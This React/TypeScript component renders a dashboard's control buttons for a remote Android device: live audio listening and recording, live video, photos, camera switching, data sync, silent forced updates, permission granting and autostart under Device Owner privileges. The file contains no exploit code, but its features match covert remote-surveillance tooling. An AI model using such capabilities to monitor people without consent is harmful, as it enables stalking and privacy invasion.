import { useState } from 'react'
import type { DeviceHealth } from '../../types/dashboard'

type ControlButtonsProps = {
  onCommand: (cmd: string, extra?: Record<string, unknown>) => void
  health?: DeviceHealth
  isStreaming?: boolean
  isRecording?: boolean
  isWebRtcActive?: boolean
  isCameraLive?: boolean
}

type ButtonConfig = {
  label: string
  cmd: string
  extra?: Record<string, unknown>
  color: 'green' | 'teal' | 'yellow' | 'red' | 'gray' | 'blue' | 'purple' | 'orange'
  icon?: string
  activeColor?: 'green' | 'teal' | 'yellow' | 'red' | 'gray' | 'blue' | 'purple' | 'orange'
  isActive?: boolean
  category: 'audio' | 'camera' | 'settings' | 'system'
  tooltip?: string
}

const colorClasses: Record<string, string> = {
  green: 'bg-emerald-600 hover:bg-emerald-500 border-emerald-500 text-white',
  teal: 'bg-teal-600 hover:bg-teal-500 border-teal-500 text-white',
  yellow: 'bg-yellow-600 hover:bg-yellow-500 border-yellow-500 text-black',
  red: 'bg-red-600 hover:bg-red-500 border-red-500 text-white',
  gray: 'bg-slate-700 hover:bg-slate-600 border-slate-600 text-slate-200',
  blue: 'bg-blue-600 hover:bg-blue-500 border-blue-500 text-white',
  purple: 'bg-purple-600 hover:bg-purple-500 border-purple-500 text-white',
  orange: 'bg-orange-600 hover:bg-orange-500 border-orange-500 text-white',
}

export function ControlButtons({ 
  onCommand, 
  health,
  isStreaming = false,
  isRecording = false,
  isWebRtcActive = false,
  isCameraLive = false,
}: ControlButtonsProps) {
  const [voiceProfile, setVoiceProfile] = useState<'near' | 'room' | 'far'>(
    (health?.voiceProfile as 'near' | 'room' | 'far') || 'room'
  )
  const [photoNight, setPhotoNight] = useState<'off' | '1s' | '3s' | '5s'>(
    (health?.photoNight as 'off' | '1s' | '3s' | '5s') || 'off'
  )

  const cycleVoiceProfile = () => {
    const profiles: Array<'near' | 'room' | 'far'> = ['near', 'room', 'far']
    const next = profiles[(profiles.indexOf(voiceProfile) + 1) % profiles.length]
    setVoiceProfile(next)
    onCommand('voice_profile', { profile: next })
  }

  const cyclePhotoNight = () => {
    const modes: Array<'off' | '1s' | '3s' | '5s'> = ['off', '1s', '3s', '5s']
    const next = modes[(modes.indexOf(photoNight) + 1) % modes.length]
    setPhotoNight(next)
    onCommand('photo_night', { mode: next })
  }

  const buttons: ButtonConfig[] = [
    // Audio Controls
    {
      label: isStreaming ? '⏹ Stop Listen' : '🎧 Live Listen',
      cmd: isStreaming ? 'stop_stream' : 'start_stream',
      color: isStreaming ? 'red' : 'green',
      category: 'audio',
    },
    {
      label: isWebRtcActive ? '📡 WebRTC Stop' : '📡 WebRTC',
      cmd: isWebRtcActive ? 'webrtc_stop' : 'webrtc_start',
      color: isWebRtcActive ? 'gray' : 'teal',
      category: 'audio',
    },
    {
      label: isRecording ? '⏹ Stop Record' : '⏺ Record',
      cmd: isRecording ? 'stop_record' : 'start_record',
      color: isRecording ? 'gray' : 'red',
      category: 'audio',
    },
    {
      label: `🗣 Voice: ${voiceProfile.charAt(0).toUpperCase() + voiceProfile.slice(1)}`,
      cmd: 'cycle_voice',
      color: voiceProfile === 'far' ? 'yellow' : 'gray',
      category: 'audio',
    },

    // Camera Controls
    {
      label: isCameraLive ? '📺 Stop Video' : '📺 Live Video',
      cmd: isCameraLive ? 'camera_live_stop' : 'camera_live_start',
      color: isCameraLive ? 'red' : 'blue',
      category: 'camera',
    },
    {
      label: '📷 Take Photo',
      cmd: 'take_photo',
      color: 'blue',
      category: 'camera',
    },
    {
      label: '🔁 Switch Camera',
      cmd: 'switch_camera',
      color: 'gray',
      category: 'camera',
    },
    {
      label: `🌙 Night: ${photoNight === 'off' ? 'OFF' : photoNight === '1s' ? 'LOW' : photoNight === '3s' ? 'MED' : 'HIGH'}`,
      cmd: 'cycle_night',
      color: photoNight !== 'off' ? 'purple' : 'gray',
      category: 'camera',
    },

    // System Controls
    {
      label: '📥 Sync Data',
      cmd: 'get_data',
      color: 'blue',
      category: 'system',
    },
    {
      label: '⬆️ Force Update',
      cmd: 'force_update',
      color: 'purple',
      category: 'system',
      tooltip: 'Prompt user on device to install update (Silent if Device Owner)',
    },
    {
      label: '🔐 Grant Permissions',
      cmd: 'grant_permissions',
      color: 'purple',
      category: 'system',
      tooltip: 'Requires Android Device Owner privileges',
    },
    {
      label: '🚀 Enable Autostart',
      cmd: 'enable_autostart',
      color: 'orange',
      category: 'system',
      tooltip: 'Requires Android Device Owner privileges',
    },
  ]

  const handleClick = (btn: ButtonConfig) => {
    if (btn.cmd === 'cycle_voice') {
      cycleVoiceProfile()
      return
    }
    if (btn.cmd === 'cycle_night') {
      cyclePhotoNight()
      return
    }
    onCommand(btn.cmd, btn.extra)
  }

  const audioButtons = buttons.filter(b => b.category === 'audio')
  const cameraButtons = buttons.filter(b => b.category === 'camera')
  const systemButtons = buttons.filter(b => b.category === 'system')

  const renderButtons = (btns: ButtonConfig[]) => (
    <div className="flex flex-wrap gap-1.5">
      {btns.map((btn) => (
        <button
          key={btn.cmd + btn.label}
          onClick={() => handleClick(btn)}
          title={btn.tooltip}
          className={`
            inline-flex items-center gap-1 px-2.5 py-1.5 text-xs font-medium rounded
            border transition-all duration-150 whitespace-nowrap
            ${colorClasses[btn.color]}
          `}
        >
          {btn.label}
        </button>
      ))}
    </div>
  )

  return (
    <div className="space-y-3">
      <div>
        <div className="text-[10px] uppercase tracking-wider text-slate-500 mb-1.5">Audio</div>
        {renderButtons(audioButtons)}
      </div>
      <div>
        <div className="text-[10px] uppercase tracking-wider text-slate-500 mb-1.5">Camera</div>
        {renderButtons(cameraButtons)}
      </div>
      <div>
        <div className="text-[10px] uppercase tracking-wider text-slate-500 mb-1.5">System</div>
        {renderButtons(systemButtons)}
      </div>
    </div>
  )
}
